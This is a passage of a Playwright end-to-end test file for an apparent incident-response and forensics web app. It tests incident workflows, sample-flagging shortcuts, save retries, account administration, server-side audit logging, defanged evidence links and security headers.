  const menu = page.getByRole('menu')

  // From the right-click menu of the panel.
  await row.click({ button: 'right' })
  await menu.getByRole('menuitem', { name: 'Assign to me' }).click()
  await expect(row).toContainText('@admin')
  await row.click({ button: 'right' })
  await menu.getByRole('menuitem', { name: 'Mark as in progress' }).click()
  await expect(row).toContainText('in progress')

  // The Summary shows the same and saves a change; the header follows.
  await row.getByRole('button').first().click()
  await page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Summary', exact: true }).click()
  await expect(page.locator('#incident-status')).toHaveValue('in_progress')
  await expect(page.locator('#incident-assignee')).toHaveValue('admin')
  await expect(page.getByRole('banner')).toContainText('assigned to admin')
  await page.locator('#incident-status').selectOption('closed')
  await page.getByRole('button', { name: 'Save', exact: true }).click()
  await expect(row).toContainText('closed')

  // The filters of the panel.
  await panel.getByLabel('Status filter').selectOption('open')
  await expect(row).toHaveCount(0)
  await panel.getByLabel('Status filter').selectOption('closed')
  await expect(row).toHaveCount(1)
  await panel.getByRole('button', { name: 'mine' }).click()
  await expect(row).toHaveCount(1)
  await row.click({ button: 'right' })
  await menu.getByRole('menuitem', { name: 'Remove the assignee (admin)' }).click()
  await expect(list).toContainText('No incident matches the filters.')
  await panel.getByRole('button', { name: 'mine' }).click()
  await panel.getByLabel('Status filter').selectOption('all')
  await row.click({ button: 'right' })
  await menu.getByRole('menuitem', { name: 'Mark as open' }).click()
  await expect(row).not.toContainText('closed')
})

test('keyboard shortcuts: F flags the row under the pointer, C comments, ? lists them', async () => {
  const tabs = page.locator('nav[aria-label="Analysis tabs"]')
  await tabs.getByRole('button', { name: 'Malware Analysis', exact: true }).click()
  const sample = page.getByRole('list', { name: 'Samples' }).locator('li', { hasText: 'dropper.bin' })
  const flag = sample.getByLabel('Flagged')
  const before = await flag.count()

  // F toggles the flag of the row under the pointer, as its menu would.
  await sample.hover()
  await page.keyboard.press('f')
  await expect(flag).toHaveCount(before ? 0 : 1)
  await expect(page.getByText(before ? 'Flag removed: dropper.bin' : 'Flagged: dropper.bin')).toBeVisible()
  await page.keyboard.press('f')
  await expect(flag).toHaveCount(before)

  // C asks for the comment.
  await page.keyboard.press('c')
  const comment = page.getByRole('dialog', { name: 'Comment on the sample' })
  await expect(comment).toBeVisible()
  // Typing in a field is typing: no shortcut runs.
  await comment.getByRole('textbox').fill('fc?')
  await expect(comment.getByRole('textbox')).toHaveValue('fc?')
  await page.keyboard.press('Escape')
  await expect(comment).toHaveCount(0)
  await expect(flag).toHaveCount(before)

  // The menu shows the keys; "?" and the header button list every shortcut.
  await sample.click({ button: 'right' })
  await expect(page.getByRole('menuitem', { name: /flag/i }).first()).toContainText('F')
  await page.keyboard.press('Escape')
  await page.keyboard.press('?')
  const help = page.getByRole('dialog', { name: 'Keyboard shortcuts' })
  await expect(help).toContainText('Flag the row under the pointer')
  await page.keyboard.press('Escape')
  await expect(help).toHaveCount(0)
  await page.getByRole('button', { name: 'Keyboard shortcuts' }).click()
  await expect(help).toBeVisible()
  await page.keyboard.press('Escape')

  // Nothing to flag under the pointer: said, not guessed.
  await page.getByRole('banner').hover()
  await page.keyboard.press('f')
  await expect(page.getByText('Nothing to flag under the pointer.')).toBeVisible()
})

test("saves are retried, merged with a colleague's, resumed after the session expires; a removed flag comes back", async () => {
  const incidentId = decodeURIComponent(new URL(page.url()).pathname.split('/incident/')[1] ?? '')
  expect(incidentId).not.toBe('')
  const stored = async () => (await page.request.get(`/api/incidents/${incidentId}`)).json()
  const storedFlags = async () => Object.keys((await stored()).flags ?? {}).length
  const sample = page.getByRole('list', { name: 'Samples' }).locator('li', { hasText: 'dropper.bin' })
  const flag = sample.getByLabel('Flagged')
  const toggle = async () => {
    await sample.hover()
    await page.keyboard.press('f')
  }
  const failSaves = (route) => (route.request().method() === 'PATCH' ? route.abort() : route.fallback())
  const unsaved = page.getByRole('alert').filter({ hasText: 'Changes not saved yet' })
  const before = await flag.count()
  const flagsBefore = await storedFlags()
  const other = before ? flagsBefore - 1 : flagsBefore + 1

  // A save that fails is said, kept, and sent when asked again.
  await page.route('**/api/incidents/*', failSaves)
  await toggle()
  await expect(flag).toHaveCount(before ? 0 : 1)
  await expect(unsaved).toBeVisible()
  expect(await storedFlags()).toBe(flagsBefore)
  await page.unroute('**/api/incidents/*', failSaves)
  await unsaved.getByRole('button', { name: 'Retry now' }).click()
  await expect(unsaved).toHaveCount(0)
  await expect.poll(storedFlags).toBe(other)

  // A colleague writes to the same incident meanwhile: both changes are kept.
  const note = await page.request.post(`/api/incidents/${incidentId}/notes`, {
    data: { text: 'note from a colleague' },
  })
  expect(note.status()).toBe(201)
  await toggle()
  await expect(flag).toHaveCount(before)
  await expect.poll(storedFlags).toBe(flagsBefore)
  expect((await stored()).notes.map((item) => item.text)).toContain('note from a colleague')

  // The session ends with a change still to save: signing in again saves it.
  await page.route('**/api/incidents/*', failSaves)
  await toggle()
  await expect(unsaved).toBeVisible()
  await page.request.post('/api/auth/logout')
  await page.unroute('**/api/incidents/*', failSaves)
  await unsaved
    .getByRole('button', { name: 'Retry now' })
    .click({ timeout: 2000 })
    .catch(() => {})
  const expired = page.getByRole('dialog', { name: 'Session expired' })
  await expect(expired).toContainText('not saved yet')
  await expired.getByLabel('Password of admin').fill(ADMIN.password)
  await expired.getByRole('button', { name: 'Sign in again' }).click()
  await expect(expired).toHaveCount(0)
  await expect.poll(storedFlags).toBe(other)
  await expect(unsaved).toHaveCount(0)

  // Removing a flag can be undone.
  if (!(await flag.count())) await toggle()
  await expect(flag).toHaveCount(1)
  await toggle()
  await expect(flag).toHaveCount(0)
  await page.getByRole('button', { name: 'Undo' }).last().click()
  await expect(flag).toHaveCount(1)
  if (!before) {
    await toggle()
    await expect(flag).toHaveCount(0)
  }
  await expect.poll(storedFlags).toBe(flagsBefore)
})

test('an admin manages accounts; the audit log is written by the server', async ({ browser }) => {
  await page.getByRole('button', { name: 'Open platform settings' }).click()
  const settings = page.getByRole('dialog', { name: 'Settings' })
  const sections = settings.getByRole('navigation', { name: 'Settings sections' })
  await sections.getByText('Accounts').click()

  // A new analyst, then renamed, promoted and given another password from the pencil.
  await settings.locator('#add-username').fill('anna')
  await settings.locator('#add-password').fill('first-secret')
  await settings.getByRole('button', { name: 'Add user' }).click()
  const accounts = settings.getByRole('list', { name: 'Accounts' })
  const anna = accounts.getByRole('listitem').filter({ hasText: 'anna' })
  await expect(anna).toContainText('Analyst')
  await anna.getByRole('button', { name: 'Edit user anna' }).click()
  const edit = page.getByRole('dialog', { name: 'Account: anna' })
  await edit.locator('#edit-username').fill('anna.b')
  await edit.getByRole('combobox').selectOption('admin')
  await edit.locator('#edit-password').fill('second-secret')
  await edit.getByRole('button', { name: 'Save changes' }).click()
  await expect(edit).toHaveCount(0)
  const renamed = accounts.getByRole('listitem').filter({ hasText: 'anna.b' })
  await expect(renamed).toContainText('Admin')

  // The account signs in with its new name and password, and changes its own password.
  const other = await browser.newPage()
  await other.goto('/')
  await other.fill('#login-username', 'anna.b')
  await other.fill('#login-password', 'second-secret')
  await other.click('button[type=submit]')
  await other.getByRole('button', { name: 'Open platform settings' }).click()
  const theirs = other.getByRole('dialog', { name: 'Settings' })
  await theirs.getByRole('navigation', { name: 'Settings sections' }).getByText('My account').click()
  await theirs.locator('#own-current-password').fill('second-secret')
  await theirs.locator('#own-new-password').fill('third-secret')
  await theirs.locator('#own-confirm-password').fill('third-secret')
  await theirs.getByRole('button', { name: 'Change password' }).click()
  await expect(theirs.getByRole('status')).toContainText('Password changed')

  // Disabled by the admin: the open session is over at its next request.
  await renamed.getByRole('button', { name: 'Edit user anna.b' }).click()
  const again = page.getByRole('dialog', { name: 'Account: anna.b' })
  await again.getByRole('checkbox').check()
  await again.getByRole('button', { name: 'Save changes' }).click()
  await expect(renamed).toContainText('Disabled')
  await theirs.getByRole('navigation', { name: 'Settings sections' }).getByText('Audit log').click()
  await expect(other.getByRole('dialog', { name: 'Session expired' })).toBeVisible()
  await other.close()

  // The admin cannot lock themselves out.
  await accounts
    .getByRole('listitem')
    .filter({ hasText: 'You' })
    .getByRole('button', { name: /^Edit user/ })
    .click()
  const own = page.getByRole('dialog', { name: `Account: ${ADMIN.username}` })
  await expect(own.getByRole('combobox')).toBeDisabled()
  await expect(own.getByRole('checkbox')).toBeDisabled()
  await own.getByRole('button', { name: 'Cancel' }).click()

  // Everything above is in the audit log, recorded by the server.
  await sections.getByText('Audit log').click()
  for (const text of ['user.create', 'renamed from "anna"', 'password reset', 'user.password', 'disabled']) {
    await expect(settings.getByText(text).first()).toBeVisible()
  }
  // It cannot be written from the browser.
  const forged = await page.request.post('/api/audit', { data: { action: 'incident.delete', details: 'not me' } })
  expect(forged.status()).toBe(400)

  await sections.getByText('Accounts').click()
  await renamed.getByRole('button', { name: 'Delete user anna.b' }).click()
  await expect(renamed).toHaveCount(0)
  await settings.getByRole('button', { name: 'Close' }).click()
})

test('an address from the evidence is opened only after asking', async () => {
  const tabs = page.locator('nav[aria-label="Analysis tabs"]')
  await tabs.getByRole('button', { name: 'Browser Forensics', exact: true }).click()
  await page
    .getByRole('navigation', { name: 'Browser analysis sections' })
    .getByRole('button', { name: /^Bookmarks/ })
    .click()
  const open = page.getByRole('button', { name: 'Open the address' }).first()
  await expect(open).toBeVisible()
  // No link to the suspect's address is left in the page for a stray click.
  await expect(page.locator('main a[target="_blank"]')).toHaveCount(0)

  const popups = []
  page.context().on('page', (popup) => popups.push(popup))
  await open.click()
  const ask = page.getByRole('dialog', { name: 'Open an address from the evidence?' })
  await expect(ask).toContainText('from your workstation')
  await expect(ask).toContainText(/hxxps?\[:\]\/\//)
  await ask.getByRole('button', { name: 'Copy defanged' }).click()
  await ask.getByRole('button', { name: 'Cancel' }).click()
  await expect(ask).toHaveCount(0)
  expect(popups).toEqual([])
})

test('the app runs under its security headers, and the policy blocked nothing', async ({ request }) => {
  const headers = (await request.get('/')).headers()
  expect(headers['content-security-policy']).toContain("script-src 'self' 'wasm-unsafe-eval'")
  expect(headers['content-security-policy']).toContain("frame-ancestors 'none'")
  expect(headers['x-content-type-options']).toBe('nosniff')
  expect(headers['x-frame-options']).toBe('DENY')
  expect(blocked).toEqual([])
})

test('the API is reachable through the same origin', async ({ request }) => {
  const health = await request.get('/api/health')
  expect(health.ok()).toBeTruthy()
  const ready = await request.get('/api/ready')
  expect(ready.ok()).toBeTruthy()
})
